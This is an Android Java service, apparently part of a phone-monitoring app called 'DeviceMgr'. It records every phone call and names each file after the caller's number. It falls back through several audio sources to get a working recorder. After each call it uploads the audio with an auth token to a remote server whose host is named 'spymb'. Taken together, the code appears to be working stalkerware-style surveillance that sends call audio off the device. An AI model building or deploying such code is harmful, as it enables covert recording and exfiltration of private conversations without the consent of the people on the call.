package com.company.devicemgr.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import com.company.devicemgr.utils.HttpClient;

public class CallRecorderService extends Service {
	private static final String TAG = "CallRecorderSvc";
	private static final String CHANNEL_ID = "call_recorder_channel";
	private static final int NOTIF_ID = 2002;
	private static final long MIN_UPLOAD_BYTES = 1024; // threshold only informational now
	
	private TelephonyManager telephonyManager;
	private PhoneStateListener phoneListener;
        private MediaRecorder recorder;
        private File currentFile;
        private final int[] audioSources = new int[]{
                MediaRecorder.AudioSource.VOICE_CALL,
                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.MIC
        };
	
	@Override
	public void onCreate() {
		super.onCreate();
		createNotificationChannel();
	}
	
	private void createNotificationChannel() {
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
			NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Call Recorder", NotificationManager.IMPORTANCE_LOW);
			NotificationManager nm = (NotificationManager) getSystemService(NotificationManager.class);
			if (nm != null) nm.createNotificationChannel(ch);
		}
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// must call startForeground quickly
		Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
		.setContentTitle("DeviceMgr - Call recorder")
		.setContentText("A gravar chamadas (se autorizadas)")
		.setSmallIcon(android.R.drawable.ic_lock_silent_mode)
		.setPriority(NotificationCompat.PRIORITY_LOW)
		.build();
		startForeground(NOTIF_ID, n);
		
		// Check permissions
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
			if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ||
			checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
				Log.i(TAG, "missing RECORD_AUDIO or READ_PHONE_STATE permission");
				stopForeground(true);
				stopSelf();
				return START_NOT_STICKY;
			}
		}
		
		startPhoneListener();
		
		return START_STICKY;
	}
	
	private void startPhoneListener() {
		try {
			telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
			phoneListener = new PhoneStateListener() {
				@Override
				public void onCallStateChanged(int state, String phoneNumber) {
					Log.d(TAG, "call state changed: " + state + " number:" + phoneNumber);
					if (state == TelephonyManager.CALL_STATE_OFFHOOK) {
						// call started -> start recording
						startRecording(phoneNumber);
						} else if (state == TelephonyManager.CALL_STATE_IDLE) {
						// call ended -> stop recording
						stopRecordingAndUpload();
					}
				}
			};
			if (telephonyManager != null) {
				telephonyManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
			}
			} catch (Exception e) {
			Log.e(TAG, "startPhoneListener err", e);
		}
	}
	
        private void startRecording(String number) {
                try {
                        stopRecordingInternal(false);

                        File dir = getExternalFilesDir("calls");
                        if (dir == null) dir = getFilesDir();
                        if (dir != null && !dir.exists()) dir.mkdirs();

                        String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
                        String safeNumber = (number != null) ? number.replaceAll("[^0-9]", "") : "";
                        String fname = "call_" + ts + (safeNumber.isEmpty() ? "" : ("_" + safeNumber)) + ".m4a";
                        currentFile = (dir != null) ? new File(dir, fname) : new File(getFilesDir(), fname);

                        recorder = buildRecorder(currentFile);
                        if (recorder == null) {
                                Log.e(TAG, "no recorder available");
                                currentFile = null;
                                return;
                        }

                        recorder.start();
                        Log.i(TAG, "recording started: " + currentFile.getAbsolutePath());
                        } catch (Exception e) {
                        Log.e(TAG, "startRecording err", e);
                        cleanupRecorder();
                        if (currentFile != null && currentFile.exists() && currentFile.length() == 0) {
                                // remove empty placeholder
                                boolean deleted = currentFile.delete();
                                Log.d(TAG, "deleted empty call file: " + deleted);
                        }
                        currentFile = null;
                }
        }

        private MediaRecorder buildRecorder(File target) {
                Exception last = null;
                for (int source : audioSources) {
                        MediaRecorder mr = new MediaRecorder();
                        try {
                                mr.setAudioSource(source);
                                mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                                mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                                mr.setAudioEncodingBitRate(64000);
                                mr.setAudioSamplingRate(16000);
                                try { mr.setAudioChannels(1); } catch (Exception ignore) {}
                                mr.setOutputFile(target.getAbsolutePath());
                                mr.prepare();
                                Log.i(TAG, "recorder prepared with source=" + source);
                                return mr;
                                } catch (Exception e) {
                                last = e;
                                Log.w(TAG, "audio source " + source + " failed", e);
                                try { mr.reset(); } catch (Exception ignore) {}
                                try { mr.release(); } catch (Exception ignore) {}
                        }
                }
                if (last != null) Log.e(TAG, "no audio source succeeded", last);
                return null;
        }

        private void cleanupRecorder() {
                try {
                        if (recorder != null) {
                                try { recorder.reset(); } catch (Exception ignore) {}
                                try { recorder.release(); } catch (Exception ignore) {}
                        }
                        } finally {
                        recorder = null;
                }
        }

        private void stopRecordingInternal(boolean upload) {
                try {
                        if (recorder != null) {
                                try {
                                        recorder.stop();
                                        } catch (Exception e) {
                                        Log.w(TAG, "recorder stop warning", e);
                                }
                        }
                        } catch (Exception e) {
                        Log.e(TAG, "stopRecordingInternal err", e);
                        } finally {
                        cleanupRecorder();
                        if (upload) {
                                scheduleUpload();
                        }
                }
        }

        private void stopRecordingAndUpload() {
                stopRecordingInternal(true);
        }

        private void scheduleUpload() {
                final File fileToUpload = currentFile;
                currentFile = null;
                if (fileToUpload == null || !fileToUpload.exists()) {
                        Log.w(TAG, "scheduleUpload: no file to upload");
                        return;
                }

                new Thread(() -> {
                        boolean uploaded = false;
                        try {
                                long size = fileToUpload.length();
                                Log.i(TAG, ">>> will upload file: " + fileToUpload.getAbsolutePath() + " size=" + size);

                                SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
                                String deviceId = sp.getString("deviceId", "unknown");
                                String token = sp.getString("auth_token", null);
                                Log.i(TAG, "upload deviceId=" + deviceId + " token?=" + (token != null ? "yes" : "NO"));

                                int maxAttempts = 3;
                                for (int attempt = 1; attempt <= maxAttempts; attempt++) {
                                        try {
                                                Log.i(TAG, "upload attempt " + attempt + " for file " + fileToUpload.getName());
                                                String resp = uploadFileSync(fileToUpload);
                                                Log.i(TAG, "upload success resp (len=" + (resp != null ? resp.length() : 0) + "): " + (resp != null ? (resp.length() > 200 ? resp.substring(0,200) + "..." : resp) : "null"));
                                                uploaded = true;
                                                break;
                                                } catch (Exception e) {
                                                Log.e(TAG, "upload attempt " + attempt + " failed: " + e.getMessage(), e);
                                                if (attempt < maxAttempts) {
                                                        try { Thread.sleep(1000L * (long)Math.pow(2, attempt)); } catch (InterruptedException ie) { /* ignore */ }
                                                }
                                        }
                                }

                                if (uploaded) {
                                        try {
                                                File up = new File(fileToUpload.getParentFile(), "uploaded_" + fileToUpload.getName());
                                                boolean ok = fileToUpload.renameTo(up);
                                                Log.i(TAG, "moved uploaded -> " + up.getAbsolutePath() + " ok=" + ok);
                                                } catch (Exception e) {
                                                Log.w(TAG, "rename to uploaded_ failed", e);
                                        }
                                        } else {
                                        moveToFailed(fileToUpload);
                                }
                                } catch (Exception e) {
                                Log.e(TAG, "scheduleUpload outer err", e);
                                moveToFailed(fileToUpload);
                        }
                }).start();
        }

        private void moveToFailed(File fileToUpload) {
                try {
                        File parent = fileToUpload.getParentFile();
                        if (parent == null) parent = getFilesDir();
                        File failedDir = new File(parent, "failed");
                        if (!failedDir.exists()) failedDir.mkdirs();
                        File dest = new File(failedDir, "failed_" + fileToUpload.getName());
                        boolean ok = fileToUpload.renameTo(dest);
                        Log.i(TAG, "moved failed file to: " + dest.getAbsolutePath() + " ok=" + ok);
                        } catch (Exception ex) {
                        Log.e(TAG, "move failed err", ex);
                }
        }
	
	/**
	* Upload síncrono do ficheiro — devolve a resposta do HttpClient (string)
	*/
	private String uploadFileSync(File f) throws Exception {
		SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
		String deviceId = sp.getString("deviceId", "unknown");
		String token = sp.getString("auth_token", null);
		String url = "https://spymb.onrender.com/api/media/" + deviceId + "/upload";
		// HttpClient.uploadFile deve ser síncrono e devolver String (já existente no teu util)
		return HttpClient.uploadFile(url, "media", f, token);
	}
	
	@Override
	public void onDestroy() {
		try {
			if (telephonyManager != null && phoneListener != null) telephonyManager.listen(phoneListener, PhoneStateListener.LISTEN_NONE);
		} catch (Exception ignored) {}
		try { if (recorder != null) { recorder.release(); recorder = null; } } catch (Exception ignored) {}
		try { stopForeground(true); } catch (Exception ignored) {}
		super.onDestroy();
	}
	
	@Override
	public IBinder onBind(Intent intent) { return null; }
}